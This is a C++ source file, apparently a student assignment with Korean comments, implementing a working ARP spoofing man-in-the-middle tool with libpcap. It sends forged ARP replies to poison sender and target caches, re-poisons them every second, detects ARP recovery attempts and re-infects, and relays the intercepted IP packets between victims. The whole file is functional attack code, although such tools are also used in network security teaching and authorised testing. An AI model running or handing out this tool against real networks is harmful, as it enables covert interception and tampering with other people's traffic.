#include <iostream>
#include <vector>
#include <map>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <thread>
#include <chrono>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct EthIpPacket {
    EthHdr eth_;
    struct iphdr ip_;
    uint8_t data_[1500];
};
#pragma pack(pop)

struct FlowInfo {
    Mac sender_mac;
    Ip sender_ip;
    Mac target_mac;
    Ip target_ip;
};

void usage() {
    std::cout << "syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n";
    std::cout << "example: arp-spoof wlan0 192.168.10.2 192.168.10.1\n";
}

Mac get_my_mac(const char* dev) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        std::cerr << "Socket open error\n";
        exit(EXIT_FAILURE);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        std::cerr << "ioctl error\n";
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    close(sockfd);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip get_my_ip(const char* dev) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        std::cerr << "Socket open error\n";
        exit(EXIT_FAILURE);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        std::cerr << "ioctl error\n";
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    close(sockfd);
    return Ip(ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr));
}

Mac get_mac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip target_ip) {
    EthArpPacket req_pkt;
    req_pkt.eth_.dmac_ = Mac::broadcastMac();
    req_pkt.eth_.smac_ = my_mac;
    req_pkt.eth_.type_ = htons(EthHdr::Arp);
    req_pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
    req_pkt.arp_.pro_ = htons(EthHdr::Ip4);
    req_pkt.arp_.hln_ = Mac::Size;
    req_pkt.arp_.pln_ = Ip::Size;
    req_pkt.arp_.op_ = htons(ArpHdr::Request);
    req_pkt.arp_.smac_ = my_mac;
    req_pkt.arp_.sip_ = htonl(my_ip);
    req_pkt.arp_.tmac_ = Mac::nullMac();
    req_pkt.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_pkt), sizeof(EthArpPacket));
    if (res != 0) {
        std::cerr << "PCAP sendpacket error\n";
        return Mac::nullMac();
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply;
        int res = pcap_next_ex(handle, &header, &reply);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        auto* arp_reply = (EthArpPacket*) reply;
        if (ntohs(arp_reply->eth_.type_) == EthHdr::Arp &&
            ntohs(arp_reply->arp_.op_) == ArpHdr::Reply &&
            ntohl(arp_reply->arp_.sip_) == target_ip) {
            return arp_reply->arp_.smac_;
        }
    }
    return Mac::nullMac();
}

void send_arp_spoof(pcap_t* handle, Mac my_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        std::cerr << "PCAP sendpacket error\n";
    }
}

void relay_packet(pcap_t* handle, const u_char* packet, int len, Mac my_mac, Mac dest_mac) {
    u_char* relay_packet = new u_char[len];
    memcpy(relay_packet, packet, len);

    EthHdr* eth_hdr = (EthHdr*)relay_packet;
    eth_hdr->smac_ = my_mac;
    eth_hdr->dmac_ = dest_mac;

    if (pcap_sendpacket(handle, relay_packet, len) != 0) {
        std::cerr << "Failed to relay packet\n";
    }

    delete[] relay_packet;
}

void process_packets(pcap_t* handle, Mac my_mac, std::vector<FlowInfo>& flows) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthHdr* eth_hdr = (EthHdr*)packet;

        // IP 패킷인 경우에만 처리
        if (ntohs(eth_hdr->type_) != EthHdr::Ip4) continue;

        // 패킷의 방향 확인 및 릴레이
        for (const auto& flow : flows) {
            if (eth_hdr->smac_ == flow.sender_mac) {
                // sender -> target 방향
                relay_packet(handle, packet, header->caplen, my_mac, flow.target_mac);
                break;
            }
            else if (eth_hdr->smac_ == flow.target_mac && eth_hdr->dmac_ == my_mac) {
                // target -> sender 방향
                relay_packet(handle, packet, header->caplen, my_mac, flow.sender_mac);
                break;
            }
        }
    }
}

void monitor_arp(pcap_t* handle, Mac my_mac, std::vector<FlowInfo>& flows) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* arp_packet = (EthArpPacket*)packet;
        if (ntohs(arp_packet->eth_.type_) != EthHdr::Arp) continue;

        // ARP 복구 시도 감지 및 재감염
        for (const auto& flow : flows) {
            if (ntohl(arp_packet->arp_.sip_) == flow.target_ip &&
                ntohl(arp_packet->arp_.tip_) == flow.sender_ip) {
                send_arp_spoof(handle, my_mac, flow.sender_mac, flow.sender_ip, flow.target_ip);
                break;
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        std::cerr << "PCAP openlive error\n";
        return -1;
    }

    Mac my_mac = get_my_mac(dev);
    Ip my_ip = get_my_ip(dev);

    std::vector<FlowInfo> flows;

    // 각 flow에 대한 정보 수집 및 초기 감염
    for (int i = 2; i < argc; i += 2) {
        FlowInfo flow;
        flow.sender_ip = Ip(argv[i]);
        flow.target_ip = Ip(argv[i+1]);

        flow.sender_mac = get_mac(handle, my_mac, my_ip, flow.sender_ip);
        if (flow.sender_mac.isNull()) {
            std::cerr << "Failed to get sender MAC\n";
            continue;
        }

        flow.target_mac = get_mac(handle, my_mac, my_ip, flow.target_ip);
        if (flow.target_mac.isNull()) {
            std::cerr << "Failed to get target MAC\n";
            continue;
        }

        flows.push_back(flow);

        // 초기 ARP 스푸핑
        send_arp_spoof(handle, my_mac, flow.sender_mac, flow.sender_ip, flow.target_ip);
    }

    // 주기적인 ARP 스푸핑을 위한 스레드
    std::thread infection_thread([&]() {
        while (true) {
            for (const auto& flow : flows) {
                send_arp_spoof(handle, my_mac, flow.sender_mac, flow.sender_ip, flow.target_ip);
            }
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    });

    // ARP 모니터링을 위한 스레드
    std::thread monitor_thread([&]() {
        monitor_arp(handle, my_mac, flows);
    });

    // 메인 패킷 처리 루프
    process_packets(handle, my_mac, flows);

    infection_thread.join();
    monitor_thread.join();
    pcap_close(handle);

    return 0;
}
